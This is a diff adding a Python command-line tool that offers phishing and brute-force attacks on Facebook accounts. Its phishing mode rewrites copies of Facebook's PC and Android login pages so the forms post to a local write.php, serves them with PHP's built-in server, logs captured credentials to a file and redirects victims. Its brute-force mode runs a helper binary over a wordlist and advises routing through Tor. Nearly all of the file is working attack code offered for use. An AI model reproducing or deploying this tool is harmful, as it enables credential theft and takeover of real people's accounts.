@@ -1,0 +1,230 @@
+#!/bin/python3
+import os
+import sys
+from time import sleep
+
+def logo():
+	print('''
+________        __
+|              /  \          |   /
+|             /    \         |  /
+|____        /______\        | /
+|           /        \       |/
+|          /          \      | \ 
+|         /            \     |  \ 
+|        /              \    |   \ 
+               
+	created by > 5M4CK3R
+
+	''')
+	sleep(1)
+
+logo()
+length = len(sys.argv)
+if (length) <= 1:
+	print('')
+	print('./fb -h')
+	print('')
+	print('-h is used to show all commands')
+	exit()
+
+def change_android(file):
+	print('')
+	print('Please Wait While Buinding ....')
+	print('')
+	sleep(3)
+	with open(file ,'r') as op:
+		all_data = op.read()
+	start = '<div class="_3-rj">'
+	end = '>Log In</span></a>'
+	s = all_data
+	real_data = s[s.find(start)+len(start):s.rfind(end)]
+	real_data = real_data.split('\n')
+	real_data = real_data[1]
+	final_data = '<a href="login.php" role="button" class="_54k8 _56bs _4n43 _6gg6 _56bu _52jh" data-sigil="touchable"><span class="_55sr">Log In</span></a>'
+	all_data = all_data.replace(real_data, final_data)
+	os.system('touch web/index.php')
+	with open('web/index.php' , 'a') as op:
+		op.write('<?php session_start(); session_destroy(); session_start(); ?>')
+		op.write(all_data)
+	print('Done ...')
+	print('')
+	sleep(1)
+
+def change_pc(file):
+	print('')
+	print('Please Wait While Buinding ....')
+	sleep(2)
+	print('')
+
+	old_data_f = '<input type="hidden" autocomplete="off" name="login_source" value="login_bluebar" /><input type="hidden" autocomplete="off" name="guid" value="" /><input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" /><input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source" /><input type="hidden" autocomplete="off" id="prefill_type" name="prefill_type" /></form>'
+	old_data_s = '<form id="login_form" action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="">'
+	old_data_t = '<label for="pass">Password</label></td></tr><tr><td>'
+	old_data_for = '/login/'
+	old_data_five = '<input value="Log In" aria-label="Log In" data-testid="royal_login_button" type="submit" id="u_0_2" /></label></td></tr><tr>'
+
+	new_data_f = '<input type="hidden" autocomplete="off" name="login_source" value="login_bluebar" /><input type="hidden" autocomplete="off" name="guid" value="" /><input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" /><input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source" /><input type="hidden" autocomplete="off" id="prefill_type" name="prefill_type" />'
+	new_data_s = '<form id="login_form" action="write.php" method="post" novalidate="1">'
+	new_data_t = '<label for="pass">Password</label></td></tr><tr><td></form><form action="write.php" method="post" name="data">'
+	new_data_for = 'login.php'
+	new_data_five = '<input value="Log In" aria-label="Log In" data-testid="royal_login_button" type="submit" id="u_0_2" /></label></td></tr><tr></form>'
+
+	with open(file , 'r') as op:
+		all_data = op.read()
+	all_data = all_data.replace(old_data_f, new_data_f)
+	all_data = all_data.replace(old_data_s, new_data_s)
+	all_data = all_data.replace(old_data_t, new_data_t)
+	all_data = all_data.replace(old_data_for , new_data_for)
+	all_data = all_data.replace(old_data_five , new_data_five)
+
+	os.system('touch web/index.php')
+	with open('web/index.php' , 'a') as op:
+		op.write('<?php session_start(); session_destroy(); session_start(); ?>')
+		op.write(all_data)
+	print('Done ...')
+	print('')
+	sleep(1)
+
+def phising():
+	data = sys.argv
+	type_position = data.index('-v')
+	version_position = type_position + 1
+	version = sys.argv[version_position] # version are define here
+	if version == 'Android' or version == 'android':
+		version = 'android'
+	elif version == 'pc' or version == 'Pc' or version == 'PC':
+		version = 'pc'
+	else:
+		print('Error')		
+		exit()
+	if version == 'android':
+		path = 'web/android'
+	else:
+		path = 'web/pc'
+	if '-f' in sys.argv:
+		data = sys.argv
+		file_position = data.index('-f')
+		file_position = file_position + 1
+		os.system('')
+		file = sys.argv[file_position] # other file of you wont to buind are located here
+		if version == 'pc':
+			change_pc(file)
+		elif version == 'android':
+			change_android(file)
+		else:
+			print('Error Please Check Command agan')
+		# modify the other html file
+		os.chdir(path)
+		os.system('rm -rf index.php')
+		os.system('mv ../index.php .')
+	else:
+		os.chdir(path)
+	data = sys.argv
+	output_position = data.index('-o')
+	output_position = output_position + 1
+	output = sys.argv[output_position] # output file name or path
+	with open('../../data/out.txt' , 'w') as op:
+		if not '/' in output:
+			output = '../../' + output
+		op.write(output)
+	data = sys.argv
+	ip_position = data.index('-i')
+	ip_position = ip_position + 1
+	ip = sys.argv[ip_position] # ip address are located here
+	data = sys.argv
+	port_position = data.index('-r')
+	port_position = port_position + 1
+	port = sys.argv[port_position] # port are define here
+	data = sys.argv
+	redirect_position = data.index('-j')
+	redirect_position = redirect_position + 1
+	redirect = sys.argv[redirect_position]
+	with open('../../data/url.txt' , 'w') as op:
+		op.write(redirect)
+	print('Server Started on ' + str(ip) + ':' + str(port))
+	print('')
+	os.system('php -S ' + str(ip) + ':' + str(port))
+	exit()
+
+def bruteforc():
+	data = sys.argv
+	type_position = data.index('-u')
+	username_position = type_position + 1
+	username = sys.argv[username_position]
+	type_position = data.index('-d')
+	password_position = type_position + 1
+	password_file_path = sys.argv[password_position]
+	print('Worning Please First Start The Tor Connection If You World List is greater than 15 ')
+	os.system('./data/br ' + username + ' ' + password_file_path)
+
+def reset_fb():
+	# type the code here to remove all files except main files
+	if not os.path.exists('web/pc/index.php'):
+		os.system('touch web/pc/index.php')
+	if not os.path.exists('web/android/index.php'):
+		os.system('touch web/android/index.php')
+	with open('web/pc/index.php' , 'w') as op:
+		op.write('<?php header("Location: login.php"); ?>')
+	with open('web/android/index.php' , 'w') as op:
+		op.write('<?php header("Location: login.php"); ?>')
+	print('')
+	print('Reset Complete ..')
+	print('')
+	exit()
+
+def help():
+	print('''
+
+all command list : 
+
+type :
+
+  -h [for List all commands]
+
+  -b [-b reffer for bruteforce attack]
+
+  -p [-p reffer for phising attack]
+
+  -d [it is use to list the path of the world list]
+
+  -u [it reffer for username]
+
+  -i [it reffer for ip address]
+
+  -r [it reffer for port]
+
+  -v [it reffer for version pc/android]
+
+  -o [Set output file path and name in .txt format]
+
+  -f [it reffer for html file]
+
+  -j [url which shuld open after login]
+
+  -r [It use to reset]
+
+Usage :
+
+for bruteforce attack : 
+
+./fb -b -u [username] -d [path of file]
+
+for phising :
+
+./fb -p -v [version pc/android] -i [ip address] -r [port] -f [ html file path ] -j [url after redirection] -o [output file name and path]
+
+for reset :
+
+./fb -r
+		''')
+
+if sys.argv[1] == '-b':
+	bruteforc()
+elif sys.argv[1] == '-h':
+	help()
+elif sys.argv[1] == '-p':
+	phising()
+elif sys.argv[1] == '-r':
+	reset_fb()
+else:
+	print('Please Type ./fb -h to see all command list ')
